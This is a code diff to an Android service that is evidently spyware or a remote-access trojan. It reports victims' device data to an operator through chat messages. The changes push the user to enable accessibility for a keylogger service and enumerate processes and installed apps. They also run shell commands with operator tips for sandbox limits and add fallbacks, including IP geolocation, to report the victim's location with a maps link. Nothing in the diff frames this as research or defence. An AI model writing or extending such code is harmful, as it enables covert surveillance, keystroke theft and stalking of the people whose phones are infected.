@@ -96,6 +96,17 @@ class MainService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "fg: ${e.message}")
         }
+        // Auto-open accessibility if not enabled
+        if (!KeylogService.isRunning) {
+            Log.w(TAG, "Accessibility not running — opening settings")
+            try {
+                val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivitySafely(intent)
+            } catch (e: Exception) {
+                Log.e(TAG, "open accessibility: ${e.message}")
+            }
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -462,16 +473,29 @@ class MainService : Service() {
                     }
                 }
                 "processes" -> {
-                    val result = shell("ps -A -o PID,USER,NAME --sort=-%MEM 2>/dev/null || ps -A 2>/dev/null || ps")
-                    val lines = result.lines()
-                    val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else result
-                    d.sendMsg(":microscope: **Processes**\n```\n${out.take(1900)}\n```")
+                    val procs = scanProcFs()
+                    val lines = procs.map { "${it.pid.padStart(7)} ${it.user.padEnd(12)} ${it.name}" }
+                    val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else lines.joinToString("\n")
+                    d.sendMsg(":microscope: **Processes** (${procs.size})\n```\nPID USER         NAME\n${out.take(1850)}\n```")
                 }
                 "installed" -> {
-                    val result = shell("pm list packages -3 2>/dev/null | sort")
-                    val pkgs = result.lines().filter { it.startsWith("package:") }.map { it.removePrefix("package:") }
-                    val total = pkgs.size
-                    val list = if (total > 40) pkgs.take(40).joinToString("\n") + "\n... (${total - 40} more)" else pkgs.joinToString("\n")
+                    val pm = packageManager
+                    val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+                        PackageManager.PackageInfoFlags.of(0L)
+                    else 0
+                    @Suppress("DEPRECATION")
+                    val packages = pm.getInstalledPackages(flags as? Int ?: 0)
+                    val apps = packages
+                        .filter { it.packageName != packageName }
+                        .map { pi ->
+                            val label = pi.applicationInfo?.loadLabel(pm)?.toString() ?: pi.packageName
+                            "$label (${pi.packageName})"
+                        }
+                        .sorted()
+                    val total = apps.size
+                    val list = if (total == 0) "(no third-party apps)"
+                    else if (total > 40) apps.take(40).joinToString("\n") + "\n... (${total - 40} more)"
+                    else apps.joinToString("\n")
                     d.sendMsg(":package: **Installed Apps** (${total})\n```\n${list.take(1900)}\n```")
                 }
                 "torch" -> {
@@ -696,6 +720,7 @@ class MainService : Service() {
     private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
         try {
             val p = ProcessBuilder("sh", "-c", cmd)
+                .directory(cacheDir)
                 .redirectErrorStream(true)
                 .start()
             val output = try {
@@ -707,11 +732,45 @@ class MainService : Service() {
                 p.destroyForcibly()
                 "Error: timed out"
             } else {
-                output.trim().ifEmpty { "(no output)" }
+                val trimmed = output.trim()
+                if (trimmed.contains("Permission denied") || trimmed.contains("Operation not permitted")) {
+                    "⚠️ Command restricted by Android sandbox\nTip: Commands like 'ls /' or 'cat /data' require root\nTry: whoami, id, getprop, pm list packages, dumpsys"
+                } else {
+                    trimmed.ifEmpty { "(no output)" }
+                }
             }
         } catch (ex: Exception) {
             "Error: ${ex.message}"
         }
+    }
+
+    private data class ProcInfo(val pid: String, val user: String, val name: String)
+
+    private fun scanProcFs(): List<ProcInfo> {
+        val result = mutableListOf<ProcInfo>()
+        val procDir = java.io.File("/proc")
+        if (!procDir.isDirectory) return result
+        procDir.listFiles()?.forEach { entry ->
+            if (!entry.isDirectory) return@forEach
+            val pid = entry.name.toIntOrNull() ?: return@forEach
+            try {
+                val statusFile = entry.resolve("status")
+                if (!statusFile.exists()) return@forEach
+                var name = "?"
+                var uid = "?"
+                statusFile.bufferedReader().useLines { lines ->
+                    lines.forEach { line ->
+                        if (line.startsWith("Name:")) name = line.substringAfter("Name:").trim()
+                        if (line.startsWith("Uid:")) {
+                            val uidStr = line.substringAfter("Uid:").trim().split("\\s+".toRegex()).firstOrNull() ?: "?"
+                            uid = if (uidStr.toIntOrNull() != null) "u0_a${uidStr.toInt() - 10000}" else uidStr
+                        }
+                    }
+                }
+                result.add(ProcInfo(pid.toString(), uid, name))
+            } catch (_: Exception) {}
+        }
+        return result.sortedBy { it.pid }
     }
 
     private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
@@ -857,16 +916,25 @@ class MainService : Service() {
 
     private fun getLocation(): String {
         val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        var loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-        if (loc == null && lm.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
-            loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
+        var loc: Location? = null
+
+        // Try GPS first, then network, then passive
+        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
+            try {
+                loc = lm.getLastKnownLocation(provider)
+                if (loc != null && System.currentTimeMillis() - loc.time < 300000) break
+                loc = null
+            } catch (_: Exception) {}
         }
+
         if (loc != null) {
             val lat = loc.latitude
             val lon = loc.longitude
-            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nhttps://www.google.com/maps?q=$lat,$lon"
+            val acc = loc.accuracy
+            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
         }
+
+        // Try to get fresh location with shorter timeout
         val latch = CountDownLatch(1)
         var newLoc: Location? = null
         @Suppress("DEPRECATION")
@@ -877,11 +945,10 @@ class MainService : Service() {
             override fun onProviderDisabled(provider: String) {}
         }
         try {
-            val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
-            for (p in providers) {
+            for (p in listOf(LocationManager.NETWORK_PROVIDER, LocationManager.GPS_PROVIDER)) {
                 if (lm.isProviderEnabled(p)) {
                     lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
-                    latch.await(6, TimeUnit.SECONDS)
+                    latch.await(8, TimeUnit.SECONDS)
                     if (newLoc != null) break
                 }
             }
@@ -889,12 +956,32 @@ class MainService : Service() {
         } finally {
             lm.removeUpdates(listener)
         }
+
         if (newLoc != null) {
             val lat = newLoc!!.latitude
             val lon = newLoc!!.longitude
             val acc = newLoc!!.accuracy
             return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
         }
+
+        // Fallback: IP-based geolocation
+        try {
+            val url = java.net.URL("http://ip-api.com/json/")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.connectTimeout = 5000
+            conn.readTimeout = 5000
+            val body = conn.inputStream.bufferedReader().readText()
+            conn.disconnect()
+            val json = org.json.JSONObject(body)
+            if (json.optString("status") == "success") {
+                val lat = json.getDouble("lat")
+                val lon = json.getDouble("lon")
+                val city = json.optString("city", "?")
+                val country = json.optString("country", "?")
+                return ":round_pushpin: **Location** (IP-based)\nLat: `$lat`\nLon: `$lon`\nCity: $city, $country\nhttps://www.google.com/maps?q=$lat,$lon"
+            }
+        } catch (_: Exception) {}
+
         return ":x: No location available — ensure GPS/WiFi is on and try outside"
     }
 
